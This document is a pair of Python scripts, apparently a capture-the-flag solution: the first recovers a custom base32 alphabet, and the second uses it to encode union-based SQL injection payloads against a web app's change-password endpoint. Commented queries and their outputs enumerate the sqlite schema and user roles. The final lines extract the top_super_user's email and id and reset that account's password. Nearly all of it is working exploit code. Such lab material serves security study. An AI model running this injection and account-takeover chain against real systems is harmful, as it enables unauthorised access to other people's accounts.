```py
# Find the custom base32 alphabet
message_to_encode = (
    "abcdefghijklmnopqrstuvwxyz0123456789_9876543210zyxwvutsrqponmlkjihgfedcba_ABCDEFGHIJKLMNOPQRSTUVWXYZ@mail.fr"
)
message_encoded = "mfrggzdfmz7wq9Iknnwg987p0byx358u0v8h06dzp1ydcmr7gq97mnzyhfp7s0bxgy971mzsg3yhu6Iy048hk4d70jyxA880nvwgw97jnb7wmzI3mnrgcx9b1jbu1rkg1433sssIjrgu579qkfjfgvcvkzIvqwk91bwwc9Imfz7h32brgy8hyucxjzguk1cdkrdA"
def find_alphabet(start, encoded):
    bin_to_check = ""
    for i in start:
        bin_to_check += format(ord(i), "#010b")[2:]
    z = ["_" for i in range(32)]
    i = 0
    for chunk in [bin_to_check[i:i+5] for i in range(0, len(bin_to_check), 5)]:
        index = int(chunk, 2)
        char = encoded[i]
        z[index] = char
        i+=1
    return "".join(z)
print((find_alphabet(message_to_encode, message_encoded)))
```

```py
import requests
import re

alphabet = "Abcd3fgh1jkImn0pqrs7uvwxyz985462"

BASE_URL = "instance"


def to_custom_base32(input):
    to_bin = ""
    for i in input:
        to_bin += format(ord(i), "#010b")[2:]
    out = ""
    for chunk in [to_bin[i : i + 5] for i in range(0, len(to_bin), 5)]:
        index = int(chunk, 2)
        out += alphabet[index]
    return out


def send_payload(payload):
    r = requests.get(f"{BASE_URL}/change-password?h={to_custom_base32(payload)}")
    if r.status_code == 200:
        m = re.search(r"password for(.*?)<input", r.text, re.DOTALL)
        return m.group(1).strip()
    else:
        return f"Error {r.status_code}"


def send_sqli(payload):
    return send_payload(f"fake@mail.fr|{payload}|PADDING")


def change_password(mail, id, new_password):
    r = requests.post(
        f"{BASE_URL}/api/change-password?h={to_custom_base32(f'{mail}|{id}|PADDING')}",
        json={"password": new_password},
    )
    if r.status_code == 200:
        return True
    else:
        return f"Error {r.status_code}"


# print(send_sqli("111111' union select group_concat(tbl_name) FROM sqlite_master WHERE type='table' --"))
# user

# print(send_sqli("111111' union select sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user' --"))
# CREATE TABLE user (
#         id INTEGER NOT NULL,
#         username VARCHAR(100) NOT NULL,
#         mail VARCHAR(100) NOT NULL,
#         password VARCHAR NOT NULL,
#         role VARCHAR NOT NULL,
#         PRIMARY KEY (id),
#         UNIQUE (mail)
# )

# print(send_sqli("111111' union select role FROM user --"))
# guest

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest'--"))
# support

# print(send_sqli("111111' union select role FROM user WHERE role != 'guest' AND role != 'support'--"))
# top_super_user

email = send_sqli("a' union select mail from user where role='top_super_user'--")
id = send_sqli("a' union select id from user where role='top_super_user'--")
password = "password"

if change_password(email, id, password) is True:
    print(f"Password for {email} (id={id}) has been changed to '{password}'")
else:
    print("Exploit error")
```
